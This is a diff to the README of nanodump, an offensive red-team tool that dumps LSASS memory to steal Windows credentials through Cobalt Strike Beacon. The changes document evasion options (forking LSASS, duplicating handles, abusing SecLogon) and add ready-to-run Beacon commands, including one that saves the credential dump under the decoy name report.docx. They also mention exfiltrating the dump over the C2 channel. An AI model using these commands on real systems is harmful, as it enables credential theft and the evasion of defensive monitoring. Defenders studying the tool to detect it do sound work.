@@ -28,7 +28,6 @@ git clone https://github.com/helpsystems/nanodump.git
 ### Compile with MinGW (optional)
 
 ```bash
-cd nanodump
 make
 ```
 
@@ -39,7 +38,7 @@ Import the `NanoDump.cna` script on Cobalt Strike.
 
 ### Run
 
-Run the `nanodump` command.
+Run the `nanodump` command in the Beacon console.
 
 ```
 beacon> nanodump
@@ -68,28 +67,58 @@ python3 -m pypykatz lsa minidump <dumpfie>
 
 ## Parameters
 
-#### --getpid (optional)
-get PID of lsass and leave.
+#### --getpid
+Get PID of LSASS and leave.
 
-#### --pid -p < PID > (optional)
-PID of lsass. If not entered, nanodump will find it dynamically.
+#### --pid -p < PID >
+Provide the PID of LSASS. If not entered, nanodump will find it dynamically.
 
 #### --write -w < path > (required for EXE)
-Where to write the dumpfile. If this parameter is not provided, the dump will be downloaded in a fileless manner.
+Where to write the dumpfile.
+* **BOF**: If this parameter is not provided, the dump will be downloaded in a fileless manner.
+* **EXE**: This parameter is required given that no C2 channel exists
 
-#### --valid -v (optional)
-If entered, the minidump will have a valid signature.  
-If not entered, before analyzing the dump restore the signature of the dump, with: `bash restore_signature.sh <dumpfile>`  
+#### --valid -v
+The minidump will have a valid signature.  
+If not entered, the signature will be invalid. Before analyzing the dump restore the signature of the dump, with: `bash restore_signature.sh <dumpfile>`  
 
-#### --fork -f (optional)
-If selected, nanodump will first create a handle to the target process with `PROCESS_CREATE_PROCESS` access, before spawning a 'clone' of the process. This new instance of the process will then be the target for memory dumping. While this will result in a new process creation, it removes the need to initially create a handle to lsass with `PROCESS_VM_READ`, which may trigger detection.
+#### --fork -f
+Create a handle to LSASS with `PROCESS_CREATE_PROCESS` access and then create a 'clone' of the process. This new process will then be the target for memory dumping. While this will result in a new process creation, it removes the need to read LSASS directly.
 
-#### --dup -d (optional)
-If selected, nanodump will search for an existing handle to LSASS and duplicate it in order to avoid opening a new handle
+#### --dup -d
+List all the handles in the system and look for an existing handle to LSASS. If found, duplicate it and access LSASS with it. This eliminates the need to open a new handle to LSASS directly.  
+*(Be aware that there is no guarantee to find such handle)*
 
-#### --seclogon -sl (optional)
-If selected, nanodump will use MalSecLogon to leak a handle to LSASS.  
-If used as BOF, a nanodump binary will be uploaded to the host!
+#### --seclogon -sl
+Leak a handle to LSASS by abusing SecLogon with `CreateProcessWithLogonW`. This eliminates the need to open a new handle to LSASS directly.
+**If used as BOF, an unsigned binary will be written to disk!**
+
+## Examples
+
+Read LSASS indirectly by creating a fork and write the dump to disk with a valid signature:
+```
+beacon> nanodump --fork --write C:\lsass.dmp --valid
+```
+
+Get a handle with MalSecLogon, read LSASS indirectly by using a fork and download the dump with a valid signature:
+```
+beacon> nanodump --seclogon --fork --valid
+```
+
+Download the dump with an invalid signature (default):
+```
+beacon> nanodump
+```
+
+Get the PID of LSASS:
+```
+beacon> nanodump --getpid
+```
+
+Duplicate an existing handle and write the dump to disk with an invalid signature:
+```
+beacon> nanodump --dup --write C:\Windows\Temp\report.docx
+```
 
 ## HTTPS redirectors
 If you are using an HTTPS redirector (as you should), you might run into issues due to the size of the requests that leak the dump.  
